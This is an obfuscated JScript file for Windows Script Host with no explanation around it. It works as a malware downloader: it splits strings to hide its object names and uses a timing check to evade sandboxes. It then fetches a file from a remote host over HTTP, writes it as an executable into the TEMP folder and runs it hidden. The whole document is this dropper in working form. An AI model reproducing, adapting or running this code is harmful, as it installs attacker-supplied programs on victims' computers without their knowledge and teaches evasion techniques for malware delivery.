var MK = false;
var AR = "Create"+"Object";
var XF = function B() {return WScript[AR]("WScript"+".Shell");}(), O = 11;
var VH = "MSXML2"+".XMLHTTP";
var DK = 2;
var JX = DK - 2;
function SF(GH){XF["Run"](GH, JX, JX);};
function TG(){return VH + "";};
function Y(B0, N){JX = JX * 1; return B0 - N;};
function QP(){return AR;};
/*@cc_on
  @if (@_win32 || @_win64)
    MK = true;
  @end
@*/
if (MK)
{
var VF = "";
function Z(){return 22;};
var J = 0; var UX = 0;
function RO()
{
var D = new this["Date"]();
var QC = D["getUTCMilliseconds"]();
WScript["Sleep"](Z());
var D = new this["Date"]();
var IK = D["getUTCMilliseconds"]();
WScript["Sleep"](Z());
var D = new this["Date"]();
var KQ = D["getUTCMilliseconds"]();
var J = "F";
J = Y(IK, QC);
var UX = "BS";
UX = Y(KQ, IK);
VF = "open";
return Y(J, UX);
}
var HV = false;
var R = false;
for (var F0 = JX; F0 < Z() * 1; F0++){if (RO() != JX){
HV = true; 
UX = "31" + 11 * J + UX; 
R = true; 
break;
}}
function VE() {return ((HV == true) && (HV == R)) ? 1 : JX;};
if (HV && VE() && R){
function X() {return XF["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "ssgCsmcQFXM.ex" + "e";};
 J0 = TG();
 F1 = WScript[AR](J0);
 var SU = 1;
do { 
	for (;SU;){
	try {
		if (SU == 1)
		{
			F1[VF]("GET", "http://new.teamlight.ru/si8svf", false);
			F1["send"]();
			C = "Sleep";
			SU = 2;
		}
		WScript[C](Z() + 120); 
		if (F1["readystate"] < 2 * 2) continue;
		SU = JX;
		function W(ZC) {var ZB = (1, 2, 3, 4, 5, ZC); return ZB;};
		JU = WScript[QP()]("ADODB.Stream");
		J0 = JU;
		J0[VF]();
		J0["type"] = W(1);
		J0["write"](F1["ResponseBody"]);
		JU["position"] = W(JX);
		J0["Save" + "ToFile"](X(), 2);
		JU["cl"+"ose"]();
		SJ = X();
		SF(SJ);
	} catch(E){};};
}while (SU);
}
}

